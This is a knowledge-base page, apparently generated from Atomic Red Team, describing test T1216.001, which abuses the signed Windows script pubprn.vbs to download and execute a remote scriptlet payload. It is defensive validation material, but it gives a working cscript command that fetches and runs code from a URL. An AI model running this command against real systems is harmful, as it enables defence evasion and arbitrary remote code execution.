---
atomic_guid: "9dd29a1f-1e16-4862-be83-913b10a88f6c"
title: "PubPrn.vbs Signed Script Bypass"
framework: "atomic"
generated: "true"
attack_technique_id: "T1216.001"
attack_technique_name: "Signed Script Proxy Execution: Pubprn"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216.001/T1216.001.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "9dd29a1f-1e16-4862-be83-913b10a88f6c"
  - "PubPrn.vbs Signed Script Bypass"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# PubPrn.vbs Signed Script Bypass

Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.

## Metadata

- Atomic GUID: 9dd29a1f-1e16-4862-be83-913b10a88f6c
- Technique: T1216.001: Signed Script Proxy Execution: Pubprn
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1216.001/T1216.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1216-system_script_proxy_execution|T1216.001]]

## Input Arguments

### remote_payload

- description: A remote payload to execute using PubPrn.vbs.
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct

## Executor

- name: command_prompt

### Command

```commandprompt
cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:#{remote_payload}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216.001/T1216.001.yaml)
